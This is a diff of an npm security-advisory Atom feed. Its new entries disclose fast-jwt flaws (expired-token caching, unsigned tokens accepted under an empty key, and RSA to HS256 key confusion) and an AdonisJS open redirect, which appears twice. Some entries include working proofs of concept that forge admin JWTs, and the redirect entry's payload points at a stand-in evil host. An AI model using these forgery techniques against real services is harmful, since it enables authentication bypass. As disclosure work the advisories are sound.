@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-10-08T20:19:27.324Z</updated>
+    <updated>2026-10-09T00:47:31.151Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,1191 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[fast-jwt] fast-jwt: Verifier cache accepts expired JWTs without iat.]]></title>
+        <id>https://github.com/advisories/GHSA-x937-hj6v-793p</id>
+        <link href="https://github.com/advisories/GHSA-x937-hj6v-793p"/>
+        <updated>2026-10-08T22:10:36.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>cacheSet</code> only derives its <code>exp</code> cache deadline inside <code>hasIat</code> (<code>src/verifier.js:127-140</code>). JWT <code>iat</code> is optional. For a valid token with <code>exp</code> but no <code>iat</code>, <code>cacheSet</code> substitutes <code>clockTimestamp + clockTolerance + cacheTTL</code> (<code>src/verifier.js:142-146</code>). Later, the cache path returns the saved payload before decoding or invoking <code>verifyToken</code> (<code>src/verifier.js:372-388</code>). Since expiration validation is in <code>verifyToken</code>, the expired token remains accepted until the cache deadline.</p>
+<h3 id="details">Details</h3>
+<p>The bug is an expiration-check bypass caused by caching.</p>
+<p>Normally, verification works like this:</p>
+<ol>
+<li>Verify signature.</li>
+<li>Check exp against the current time.</li>
+<li>Return the JWT claims.</li>
+</ol>
+<p>With caching enabled, <code>fast-jwt</code> saves successful verification results so it can avoid repeating crypto work for the same token.</p>
+<p>The intended invariant is:</p>
+<blockquote>
+<p>A cached token must stop being accepted at the same time as a non-cached token.</p>
+</blockquote>
+<p>But the cache computes its expiration incorrectly.</p>
+<p>In <code>fast-jwt/src/verifier.js:127</code>, the code first checks whether the payload has an iat (“issued at”) claim:</p>
+<pre><code class="language-js">const hasIat = payload &amp;&amp; typeof payload.iat === 'number'
+
+if (hasIat) {
+  if (!ignoreExpiration &amp;&amp; typeof payload.exp === 'number') {
+    cacheValue[2] = payload.exp * 1000 + clockTolerance
+  }
+}
+</code></pre>
+<p>That means <code>exp</code> is considered only when <code>iat</code> exists.</p>
+<p>However, <code>iat</code> is optional in JWT. A perfectly valid JWT may contain:</p>
+<pre><code class="language-js">{
+    "sub": "alice",
+    "exp": 1700000001
+}
+</code></pre>
+<p>with no iat.</p>
+<p>For that token, the expiration-based cache deadline is never set. The code falls back to the generic cache TTL—10 minutes by default:</p>
+<pre><code class="language-js">const maxTTL = clockTimestamp + clockTolerance + cacheTTL
+cacheValue[2] = cacheValue[2] === 0 ? maxTTL : Math.min(cacheValue[2], maxTTL)
+</code></pre>
+<p>Later, cache lookup happens before decoding and expiration validation:</p>
+<pre><code class="language-js">const [value, min, max] = cache.get(cacheKeyBuilder(token)) || [undefined, 0, 0]
+
+if (typeof value !== 'undefined' &amp;&amp; (max === 0 || now &lt;= max)) {
+  return handleCachedResult(value, callback, promise)
+}
+</code></pre>
+<p>So the timeline is:</p>
+<pre><code>  12:00:00  Token has exp = 12:00:01, no iat.
+  12:00:00  Server verifies it successfully and caches its claims.
+  12:00:01  Token expires.
+  12:00:02  Attacker replays the identical token.
+  12:00:02  Cache hit returns old claims; exp is never rechecked.
+  12:10:00  Cache TTL finally ends; normal expiration rejection resumes.
+</code></pre>
+<p>An attacker cannot forge a token through this issue. They need a valid token first; typically their own, or a stolen bearer token. But they can keep using it after its intended expiration if all of these are true:</p>
+<ul>
+<li>The application enables <code>cache</code>.</li>
+<li>The JWT has <code>exp</code> but no <code>iat</code>.</li>
+<li>The token was cached before expiry.</li>
+<li>It is replayed before the cache entry expires.</li>
+</ul>
+<p>Impact depends on the application. For a short-lived access token, it can extend access by up to the configured <code>cacheTTL</code> of 10 minutes by default, or more if the application configured it that way. This undermines expiry as an authentication/session boundary.</p>
+<p>The minimal repair is to calculate the cache deadline from <code>exp</code> independently of <code>iat</code>. <code>iat</code> should only matter for <code>maxAge</code>, because max age is inherently defined relative to issuance time.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-js">const assert = require('node:assert/strict')
+const { createSigner, createVerifier } = require('fast-jwt')
+
+const key = 'audit-only-secret'
+const originalNow = Date.now
+
+try {
+  const initialNow = 1_700_000_000_000
+  const exp = Math.floor(initialNow / 1000) + 1 // expires one second later
+
+  // noTimestamp intentionally omits iat, while exp is retained.
+  const sign = createSigner({
+    key,
+    algorithm: 'HS256',
+    noTimestamp: true
+  })
+  const token = sign({ sub: 'alice', exp })
+
+  const verify = createVerifier({
+    key,
+    algorithms: ['HS256'],
+    cache: true,
+    cacheTTL: 60_000
+  })
+
+  Date.now = () =&gt; initialNow
+  assert.equal(verify(token).sub, 'alice') // Valid; stores cache entry.
+
+  Date.now = () =&gt; exp * 1000 + 1
+  assert.equal(verify(token).sub, 'alice') // BUG: should throw FAST_JWT_EXPIRED.
+
+  console.log('VULNERABLE: expired exp-without-iat token served from cache')
+} finally {
+  Date.now = originalNow
+}
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This is an authentication/session-expiration bypass caused by incorrect cache validation.
+The following are impacted:</p>
+<ul>
+<li>Applications using the affected fast-jwt code with cache: true.</li>
+<li>Applications that rely on JWT exp to end sessions or limit bearer-token lifetime.</li>
+<li>Tokens with exp but no iat, after they were successfully verified and cached.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nearform/fast-jwt/security/advisories/GHSA-x937-hj6v-793p">https://github.com/nearform/fast-jwt/security/advisories/GHSA-x937-hj6v-793p</a></li>
+<li><a href="https://github.com/nearform/fast-jwt/commit/fc1ddbbe5ce38066ba2cea0b0ce0233932757167">https://github.com/nearform/fast-jwt/commit/fc1ddbbe5ce38066ba2cea0b0ce0233932757167</a></li>
+<li><a href="https://github.com/nearform/fast-jwt/releases/tag/v6.3.4">https://github.com/nearform/fast-jwt/releases/tag/v6.3.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-x937-hj6v-793p">https://github.com/advisories/GHSA-x937-hj6v-793p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-x937-hj6v-793p</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-10-08T22:10:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@adonisjs/http-server] AdonisJS: Unencoded route parameters can produce open redirects]]></title>
+        <id>https://github.com/advisories/GHSA-2m6q-8v3h-jqww</id>
+        <link href="https://github.com/advisories/GHSA-2m6q-8v3h-jqww"/>
+        <updated>2026-10-08T22:09:07.000Z</updated>
+        <content type="html"><![CDATA[<p>Route parameters are inserted into generated URLs without URI encoding.</p>
+<p>When an application passes untrusted input to a route whose first path segment is dynamic, a value beginning with / can produce a scheme-relative URL. For example:</p>
+<pre><code class="language-ts">router.get('/:page', handler).as('pages.show')
+
+response.redirect().toRoute('pages.show', {
+  page: '/evil.example.com',
+})
+</code></pre>
+<p>This generates the following redirect:</p>
+<pre><code class="language-http">Location: //evil.example.com
+</code></pre>
+<p>Browsers interpret this value as an external URL and redirect the user to <code>https://evil.example.com</code>.</p>
+<h2 id="details">Details</h2>
+<p>The shared <code>createURL()</code> helper is used by route URL builders, including <code>Router.makeUrl()</code> and <code>Response.redirect().toRoute()</code>.</p>
+<p>Route parameter values were appended without encoding:</p>
+<pre><code class="language-ts">if (isDefined) {
+  uriSegments.push(`${value}${token.end}`)
+}
+</code></pre>
+<p>Wildcard parameters had the same behavior:</p>
+<pre><code class="language-ts">uriSegments.push(`${values.join('/')}${token.end}`)
+</code></pre>
+<p><strong>The issue does not affect APIs that intentionally accept complete redirect URLs. Exploitation requires an application to pass attacker-controlled data as a route parameter and use the generated URL as a redirect destination.</strong></p>
+<h2 id="impact">Impact</h2>
+<p>An attacker may craft a link on a trusted application domain that redirects a victim to an attacker-controlled website.</p>
+<p>This can facilitate phishing and may be chained with authentication or OAuth flows that rely on trusted redirect destinations.</p>
+<p>Applications are affected when they:</p>
+<ul>
+<li>define a route whose first path segment is dynamic; and</li>
+<li>pass request-derived data to that segment when generating a redirect URL.</li>
+</ul>
+<h2 id="patches">Patches</h2>
+<p>Route parameter values are now encoded using <code>encodeURIComponent</code>.</p>
+<p>Wildcard values are encoded individually before being joined with <code>/</code>, preserving their intended segment separators:</p>
+<pre><code class="language-ts">if (isDefined) {
+  uriSegments.push(`${encodeURIComponent(String(value))}${token.end}`)
+}
+</code></pre>
+<pre><code class="language-ts">uriSegments.push(
+  `${values.map((value) =&gt; encodeURIComponent(String(value))).join('/')}${token.end}`
+)
+</code></pre>
+<p>With the fix, <code>/evil.example.com</code> becomes:</p>
+<pre><code>/%2Fevil.example.com
+</code></pre>
+<p>Fixes targeting v6 and v7 have been published below.</p>
+<ul>
+<li><a href="https://github.com/adonisjs/http-server/releases/tag/v8.2.3">https://github.com/adonisjs/http-server/releases/tag/v8.2.3</a></li>
+<li><a href="https://github.com/adonisjs/http-server/releases/tag/v9.3.0">https://github.com/adonisjs/http-server/releases/tag/v9.3.0</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/adonisjs/http-server/security/advisories/GHSA-2m6q-8v3h-jqww">https://github.com/adonisjs/http-server/security/advisories/GHSA-2m6q-8v3h-jqww</a></li>
+<li><a href="https://github.com/adonisjs/http-server/commit/4548a0631ce2ef1618f04c7b41465be42cad2f7d">https://github.com/adonisjs/http-server/commit/4548a0631ce2ef1618f04c7b41465be42cad2f7d</a></li>
+<li><a href="https://github.com/adonisjs/http-server/commit/ab607a2958327b6f0019d38f26081e431768877a">https://github.com/adonisjs/http-server/commit/ab607a2958327b6f0019d38f26081e431768877a</a></li>
+<li><a href="https://github.com/adonisjs/http-server/releases/tag/v8.2.3">https://github.com/adonisjs/http-server/releases/tag/v8.2.3</a></li>
+<li><a href="https://github.com/adonisjs/http-server/releases/tag/v9.3.0">https://github.com/adonisjs/http-server/releases/tag/v9.3.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-2m6q-8v3h-jqww">https://github.com/advisories/GHSA-2m6q-8v3h-jqww</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2m6q-8v3h-jqww</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-10-08T22:09:06.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@adonisjs/http-server] AdonisJS: Unencoded route parameters can produce open redirects]]></title>
+        <id>https://github.com/advisories/GHSA-2m6q-8v3h-jqww</id>
+        <link href="https://github.com/advisories/GHSA-2m6q-8v3h-jqww"/>
+        <updated>2026-10-08T22:09:07.000Z</updated>
+        <content type="html"><![CDATA[<p>Route parameters are inserted into generated URLs without URI encoding.</p>
+<p>When an application passes untrusted input to a route whose first path segment is dynamic, a value beginning with / can produce a scheme-relative URL. For example:</p>
+<pre><code class="language-ts">router.get('/:page', handler).as('pages.show')
+
+response.redirect().toRoute('pages.show', {
+  page: '/evil.example.com',
+})
+</code></pre>
+<p>This generates the following redirect:</p>
+<pre><code class="language-http">Location: //evil.example.com
+</code></pre>
+<p>Browsers interpret this value as an external URL and redirect the user to <code>https://evil.example.com</code>.</p>
+<h2 id="details">Details</h2>
+<p>The shared <code>createURL()</code> helper is used by route URL builders, including <code>Router.makeUrl()</code> and <code>Response.redirect().toRoute()</code>.</p>
+<p>Route parameter values were appended without encoding:</p>
+<pre><code class="language-ts">if (isDefined) {
+  uriSegments.push(`${value}${token.end}`)
+}
+</code></pre>
+<p>Wildcard parameters had the same behavior:</p>
+<pre><code class="language-ts">uriSegments.push(`${values.join('/')}${token.end}`)
+</code></pre>
+<p><strong>The issue does not affect APIs that intentionally accept complete redirect URLs. Exploitation requires an application to pass attacker-controlled data as a route parameter and use the generated URL as a redirect destination.</strong></p>
+<h2 id="impact">Impact</h2>
+<p>An attacker may craft a link on a trusted application domain that redirects a victim to an attacker-controlled website.</p>
+<p>This can facilitate phishing and may be chained with authentication or OAuth flows that rely on trusted redirect destinations.</p>
+<p>Applications are affected when they:</p>
+<ul>
+<li>define a route whose first path segment is dynamic; and</li>
+<li>pass request-derived data to that segment when generating a redirect URL.</li>
+</ul>
+<h2 id="patches">Patches</h2>
+<p>Route parameter values are now encoded using <code>encodeURIComponent</code>.</p>
+<p>Wildcard values are encoded individually before being joined with <code>/</code>, preserving their intended segment separators:</p>
+<pre><code class="language-ts">if (isDefined) {
+  uriSegments.push(`${encodeURIComponent(String(value))}${token.end}`)
+}
+</code></pre>
+<pre><code class="language-ts">uriSegments.push(
+  `${values.map((value) =&gt; encodeURIComponent(String(value))).join('/')}${token.end}`
+)
+</code></pre>
+<p>With the fix, <code>/evil.example.com</code> becomes:</p>
+<pre><code>/%2Fevil.example.com
+</code></pre>
+<p>Fixes targeting v6 and v7 have been published below.</p>
+<ul>
+<li><a href="https://github.com/adonisjs/http-server/releases/tag/v8.2.3">https://github.com/adonisjs/http-server/releases/tag/v8.2.3</a></li>
+<li><a href="https://github.com/adonisjs/http-server/releases/tag/v9.3.0">https://github.com/adonisjs/http-server/releases/tag/v9.3.0</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/adonisjs/http-server/security/advisories/GHSA-2m6q-8v3h-jqww">https://github.com/adonisjs/http-server/security/advisories/GHSA-2m6q-8v3h-jqww</a></li>
+<li><a href="https://github.com/adonisjs/http-server/commit/4548a0631ce2ef1618f04c7b41465be42cad2f7d">https://github.com/adonisjs/http-server/commit/4548a0631ce2ef1618f04c7b41465be42cad2f7d</a></li>
+<li><a href="https://github.com/adonisjs/http-server/commit/ab607a2958327b6f0019d38f26081e431768877a">https://github.com/adonisjs/http-server/commit/ab607a2958327b6f0019d38f26081e431768877a</a></li>
+<li><a href="https://github.com/adonisjs/http-server/releases/tag/v8.2.3">https://github.com/adonisjs/http-server/releases/tag/v8.2.3</a></li>
+<li><a href="https://github.com/adonisjs/http-server/releases/tag/v9.3.0">https://github.com/adonisjs/http-server/releases/tag/v9.3.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-2m6q-8v3h-jqww">https://github.com/advisories/GHSA-2m6q-8v3h-jqww</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2m6q-8v3h-jqww</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-10-08T22:09:06.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[fast-jwt] fast-jwt: createVerifier accepts unsigned JWTs when key is '' or null and algorithms is explicitly set]]></title>
+        <id>https://github.com/advisories/GHSA-8wpc-h4q6-8fxv</id>
+        <link href="https://github.com/advisories/GHSA-8wpc-h4q6-8fxv"/>
+        <updated>2026-10-08T22:02:13.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>createVerifier</code> in fast-jwt ≤ 6.3.0 skips signature verification entirely when the <code>key</code> option is a falsy synchronous value (<code>''</code> or <code>null</code>) <strong>and</strong> the <code>algorithms</code> option is set to a non-empty allowlist. An attacker who can present a JWT to the application — regardless of algorithm — can forge arbitrary claims without possessing any signing key.</p>
+<h3 id="details">Details</h3>
+<p><strong>Root cause — four cooperating code paths:</strong></p>
+<p><strong>A. Falsy sync keys bypass <code>prepareKeyOrSecret</code></strong></p>
+<p><code>createVerifier</code> branches on <code>typeof key</code>:</p>
+<pre><code class="language-js">const keyType = typeof key
+if (keyType !== 'string' &amp;&amp; keyType !== 'object' &amp;&amp; keyType !== 'function') {
+  throw new TokenError(/* ... */)
+}
+if (key &amp;&amp; keyType !== 'function') {
+  key = prepareKeyOrSecret(key, hsAlgorithms.includes(availableAlgorithms[0]))
+}
+</code></pre>
+<p>When <code>key</code> is <code>''</code> (string, falsy) or <code>null</code> (object, falsy) the outer type check passes but the <code>if (key &amp;&amp; ...)</code> guard never calls <code>prepareKeyOrSecret</code>. The empty-secret rejection added in that function is therefore never reached for sync keys:</p>
+<pre><code class="language-js">function prepareKeyOrSecret(key, isSecret) {
+  if (isSecret &amp;&amp; key.length === 0) {
+    throw new TokenError(TokenError.codes.invalidKey, 'The key cannot be an empty string or buffer.')
+  }
+  return isSecret ? createSecretKey(key) : createPublicKey(key)
+}
+</code></pre>
+<p><strong>B. Explicit <code>algorithms</code> keeps an allowlist active with no key</strong></p>
+<p>When <code>key</code> is falsy, autodetection is skipped and the caller-supplied <code>algorithms</code> (e.g. <code>['HS256']</code>) is retained in <code>allowedAlgorithms</code>. The verifier therefore accepts tokens whose header matches that list.</p>
+<p><strong>C. <code>hasKey</code> is false → missing signature is permitted</strong></p>
+<pre><code class="language-js">const hasKey = key instanceof Buffer ? key.length : !!key
+
+if (hasKey &amp;&amp; !signature) {
+  throw new TokenError(/* missingSignature */)
+} else if (!hasKey &amp;&amp; signature) {
+  throw new TokenError(/* missingKey */)
+}
+// !hasKey &amp;&amp; !signature → fall through with NO crypto
+</code></pre>
+<p>An unsigned token (<code>header.payload.</code>) produces <code>signature === ''</code>, which is falsy, so both branches are skipped.</p>
+<p><strong>D. Signature check is gated on <code>signature</code> being truthy</strong></p>
+<pre><code class="language-js">if (signature &amp;&amp; !verifySignature(header.alg, key, input, signature)) {
+  throw new TokenError(/* invalidSignature */)
+}
+</code></pre>
+<p>Empty signature → condition is <code>false</code> → <code>verifySignature</code> is never called.</p>
+<p><strong>E. Signer / verifier asymmetry</strong></p>
+<ul>
+<li><code>createSigner({ key: '' })</code> / <code>key: null</code> → <strong>rejected</strong></li>
+<li><code>createVerifier({ key: async () =&gt; '' })</code> → <strong>rejected</strong> (GHSA empty-secret tests)</li>
+<li><code>createVerifier({ key: '' | null, algorithms: [...] })</code> → <strong>accepted</strong>, then verifies unsigned tokens</li>
+</ul>
+<p>Ironically, the security best practice of setting <code>algorithms</code> <strong>enables</strong> the bypass. With <code>algorithms</code> omitted, <code>allowedAlgorithms</code> stays <code>[]</code> and every token fails closed.</p>
+<p><strong>Affected versions:</strong> confirmed on 6.3.0 (current <code>main</code> @ 378422c).
+This is an incomplete fix relative to the empty-secret hardening already applied for <code>Buffer</code> keys and <code>async</code> key functions (GHSA-gmvf lineage, PR #609).</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-bash">cd /tmp &amp;&amp; git clone --depth 1 https://github.com/nearform/fast-jwt.git &amp;&amp; cd fast-jwt &amp;&amp; npm install
+</code></pre>
+<pre><code class="language-js">// poc-empty-key-bypass.js
+const { createVerifier } = require('.')
+
+function unsigned(alg, claims) {
+  const h = Buffer.from(JSON.stringify({ alg, typ: 'JWT' })).toString('base64url')
+  const p = Buffer.from(JSON.stringify(claims)).toString('base64url')
+  return `${h}.${p}.`  // trailing dot = empty signature
+}
+
+const token = unsigned('HS256', { sub: 'attacker', admin: true, role: 'root' })
+
+// Vulnerable: key '' + explicit algorithms allowlist
+const verify = createVerifier({ key: '', algorithms: ['HS256'] })
+console.log(verify(token))
+// → { sub: 'attacker', admin: true, role: 'root' }
+
+// Also works for RS256 / ES256 / EdDSA allowlists and key: null
+console.log(createVerifier({ key: null, algorithms: ['RS256'] })(unsigned('RS256', { admin: true })))
+// → { admin: true }
+
+// Negative controls (correctly rejected):
+try { createVerifier({ key: 'secret', algorithms: ['HS256'] })(token) }
+  catch (e) { console.log('non-empty key:', e.code) }   // FAST_JWT_MISSING_SIGNATURE
+
+try { createVerifier({ key: '' })(token) }
+  catch (e) { console.log('empty key, no algorithms:', e.code) }  // FAST_JWT_INVALID_ALGORITHM
+
+try { createVerifier({ key: Buffer.alloc(0), algorithms: ['HS256'] })(token) }
+  catch (e) { console.log('empty Buffer:', e.code) }   // FAST_JWT_INVALID_KEY
+</code></pre>
+<p><strong>Expected:</strong> <code>TokenError</code> with code <code>FAST_JWT_INVALID_KEY</code>
+<strong>Actual:</strong> payload returned with no signature check</p>
+<h3 id="impact">Impact</h3>
+<p>Full authentication / authorization bypass. Any application that:</p>
+<ol>
+<li>Uses <code>createVerifier</code> with <code>key: ''</code> or <code>key: null</code> (common when a secret is read from an unset environment variable, e.g. <code>process.env.JWT_SECRET || ''</code>), <strong>and</strong></li>
+<li>Sets <code>algorithms</code> to a non-empty allowlist (a recommended security practice),</li>
+</ol>
+<p>will accept attacker-crafted JWTs with arbitrary claims. Claim checks (<code>exp</code>, <code>allowedSub</code>, etc.) still run; only signature verification is skipped.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>In <code>createVerifier</code>, fail closed before binding the verifier:</p>
+<pre><code class="language-js">if (keyType !== 'function') {
+  if (key === null || key === '' || (Buffer.isBuffer(key) &amp;&amp; key.length === 0)) {
+    throw new TokenError(TokenError.codes.invalidKey,
+      'The key cannot be null, empty, or a zero-length buffer.')
+  }
+}
+</code></pre>
+<p>Also guard the combination explicitly:</p>
+<pre><code class="language-js">if (!key &amp;&amp; allowedAlgorithms.length &gt; 0) {
+  throw new TokenError(TokenError.codes.invalidKey,
+    'The key cannot be falsy when algorithms is set.')
+}
+</code></pre>
+<p>The async path (key function resolving to <code>''</code>) is already hardened via <code>prepareKeyOrSecret</code> and does not need to change.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nearform/fast-jwt/security/advisories/GHSA-8wpc-h4q6-8fxv">https://github.com/nearform/fast-jwt/security/advisories/GHSA-8wpc-h4q6-8fxv</a></li>
+<li><a href="https://github.com/nearform/fast-jwt/pull/649">https://github.com/nearform/fast-jwt/pull/649</a></li>
+<li><a href="https://github.com/nearform/fast-jwt/commit/e22a151e83bf6d5e54e281216982d204d5665534">https://github.com/nearform/fast-jwt/commit/e22a151e83bf6d5e54e281216982d204d5665534</a></li>
+<li><a href="https://github.com/nearform/fast-jwt/releases/tag/v6.3.1">https://github.com/nearform/fast-jwt/releases/tag/v6.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-8wpc-h4q6-8fxv">https://github.com/advisories/GHSA-8wpc-h4q6-8fxv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8wpc-h4q6-8fxv</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-10-08T22:02:12.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[fast-jwt] fast-jwt: Incomplete patch of CVE-2026-34950: Non-whitespace key-prefix re-enables RSA→HS256 algorithm confusion]]></title>
+        <id>https://github.com/advisories/GHSA-ww5h-9m49-7xx4</id>
+        <link href="https://github.com/advisories/GHSA-ww5h-9m49-7xx4"/>
+        <updated>2026-10-08T22:02:08.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The fix for CVE-2026-34950 (CVSS 9.1, released in v6.2.0) is <strong>incomplete</strong>. It adds <code>key.trim()</code> to the PEM-detection path in <code>src/crypto.js</code>, but <code>String.prototype.trim()</code> only strips characters classified as whitespace by the ECMAScript specification. The subsequent <code>^</code>-anchored regex (<code>/^-----BEGIN(?: (RSA))? PUBLIC KEY-----/</code>) still requires the PEM header at position 0 — so <strong>any non-whitespace leading byte</strong> (control chars, zero-width unicode, <code>#</code> comments, HTTP-style headers, PGP wrappers) bypasses detection and falls through to the HMAC verification path, using the RSA public key as the HMAC shared secret. Net result: the <strong>exact same RSA→HS256 algorithm-confusion attack</strong> the original CVE addressed is fully re-enabled with a slightly different leading byte.</p>
+<p><strong>Attack prerequisites are identical to CVE-2026-34950</strong>: attacker knows the target's public RSA key (which is public by definition), and the target loads that key from a source whose content may have a non-whitespace prefix (DB column with corrupted encoding, YAML config with inline comment, copy-paste from formatted document, etc.).</p>
+<p><strong>Verified on <a href="mailto:fast-jwt@6.2.2">fast-jwt@6.2.2</a> (latest as of 2026-04-23) with a 10-line PoC.</strong></p>
+<h3 id="details">Details</h3>
+<p>Post-patch code (<code>src/crypto.js</code>, lines ~74-171 in <code>performDetectPublicKeyAlgorithms</code>):</p>
+<pre><code class="language-js">function performDetectPublicKeyAlgorithms(key) {
+    const trimmedKey = key.trim()  // &lt;-- CVE-2026-34950 patch added this
+    if (publicKeyPemMatcher.test(trimmedKey)) {
+        // treat as RSA/EC public key
+        ...
+    }
+    // fall-through: treat as HMAC secret  &lt;-- bug: reachable via non-whitespace prefix
+    ...
+}
+const publicKeyPemMatcher = /^-----BEGIN(?: (RSA))? PUBLIC KEY-----/
+</code></pre>
+<p><strong>The bug</strong>: <code>String.prototype.trim()</code> only strips whitespace (U+0009-U+000D, U+0020, U+00A0, U+1680, U+2000-U+200A, U+2028-U+2029, U+202F, U+205F, U+3000, U+FEFF). Non-whitespace leading bytes keep the PEM header off position 0, the <code>^</code>-anchored regex fails, and execution falls through to the HMAC path with <code>key</code> being used as the shared secret. The attacker controls the token signature (signed with the same public key) and the verifier accepts.</p>
+<p>Identical root cause as CVE-2026-34950 — the fix was textually narrow (whitespace only) rather than addressing the class (any surrounding content).</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-js">'use strict';
+const { createHmac, generateKeyPairSync } = require('node:crypto');
+const { createVerifier } = require('fast-jwt');
+
+const { publicKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
+const pem = publicKey.export({ type: 'pkcs1', format: 'pem' }).toString();
+
+// Attacker-controlled "key" content as loaded by the verifier
+// (models a realistic deployment: key with a leading metadata comment)
+const key = '# some comment\n' + pem;
+
+const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
+const payload = Buffer.from(JSON.stringify({ admin: true, sub: 'attacker' })).toString('base64url');
+const sig = createHmac('sha256', key).update(header + '.' + payload).digest('base64url');
+const forgedToken = header + '.' + payload + '.' + sig;
+
+const verifier = createVerifier({ key });
+console.log('Forged token payload:', verifier(forgedToken));
+console.log('Package version:', require('fast-jwt/package.json').version);
+</code></pre>
+<p><strong>Observed output (2026-04-23, fresh npm install):</strong></p>
+<pre><code>Forged token payload: { admin: true, sub: 'attacker' }
+Package version: 6.2.2
+</code></pre>
+<h3 id="full-bypass-matrix-all-verified-accepting-a-forged-admin-token">Full bypass matrix (all verified accepting a forged admin token)</h3>
+<table>
+<thead>
+<tr>
+<th>Leading content</th>
+<th align="center">Accepted as admin?</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code># some comment\n</code> + PEM</td>
+<td align="center">✅ BYPASS</td>
+</tr>
+<tr>
+<td><code>U+0000</code> (NUL) + PEM</td>
+<td align="center">✅ BYPASS</td>
+</tr>
+<tr>
+<td><code>U+0001</code> (SOH) + PEM</td>
+<td align="center">✅ BYPASS</td>
+</tr>
+<tr>
+<td><code>U+0008</code> (BACKSPACE) + PEM</td>
+<td align="center">✅ BYPASS</td>
+</tr>
+<tr>
+<td><code>U+001B</code> (ESC, ANSI-color) + PEM</td>
+<td align="center">✅ BYPASS</td>
+</tr>
+<tr>
+<td><code>U+007F</code> (DEL) + PEM</td>
+<td align="center">✅ BYPASS</td>
+</tr>
+<tr>
+<td><code>U+200B</code> (ZWSP) + PEM</td>
+<td align="center">✅ BYPASS</td>
+</tr>
+<tr>
+<td><code>U+200D</code> (ZWJ) + PEM</td>
+<td align="center">✅ BYPASS</td>
+</tr>
+<tr>
+<td><code>HTTP/1.1 200 OK\r\n\r\n</code> + PEM</td>
+<td align="center">✅ BYPASS</td>
+</tr>
+<tr>
+<td>PGP-wrapper text + PEM</td>
+<td align="center">✅ BYPASS</td>
+</tr>
+<tr>
+<td><code>.</code> + PEM</td>
+<td align="center">✅ BYPASS</td>
+</tr>
+<tr>
+<td><code>U+FEFF</code> (BOM) + PEM</td>
+<td align="center">❌ correctly stripped by trim</td>
+</tr>
+</tbody></table>
+<h3 id="defense-matrix-which-caller-configs-are-vulnerable">Defense matrix (which caller configs are vulnerable)</h3>
+<table>
+<thead>
+<tr>
+<th>Caller config</th>
+<th align="center">Vulnerable?</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>createVerifier({ key })</code> (no <code>algorithms</code> allowlist)</td>
+<td align="center">✗ VULNERABLE</td>
+</tr>
+<tr>
+<td><code>createVerifier({ key: asyncCallback })</code></td>
+<td align="center">✗ VULNERABLE</td>
+</tr>
+<tr>
+<td><code>createVerifier({ key, algorithms: ['RS256'] })</code></td>
+<td align="center">✓ protected</td>
+</tr>
+<tr>
+<td><code>createVerifier({ key, algorithms: ['HS256'] })</code></td>
+<td align="center">✗ VULNERABLE (attacker matches)</td>
+</tr>
+</tbody></table>
+<h3 id="impact">Impact</h3>
+<ol>
+<li><strong>Authentication bypass</strong> — attacker forges arbitrary JWT claims (admin, tenant-id, user-id) accepted by any server using fast-jwt 6.2.x without an <code>algorithms</code> allowlist AND loading its verification key from a source that may contain non-whitespace prefix bytes.</li>
+<li><strong>Severity-parity with CVE-2026-34950</strong> — attack chain, prerequisites, exploitation ease, and impact are identical; only the trigger byte differs. The fix addressed <em>one</em> trigger (whitespace) rather than the class (any surrounding content before <code>-----BEGIN</code>).</li>
+<li><strong>Broad fast-jwt deployment</strong> — default JWT backend of <code>@fastify/jwt</code>; used by many Fastify-based Node.js APIs.</li>
+</ol>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p><strong>Option A (minimal)</strong> — locate the PEM block rather than anchoring on position 0:</p>
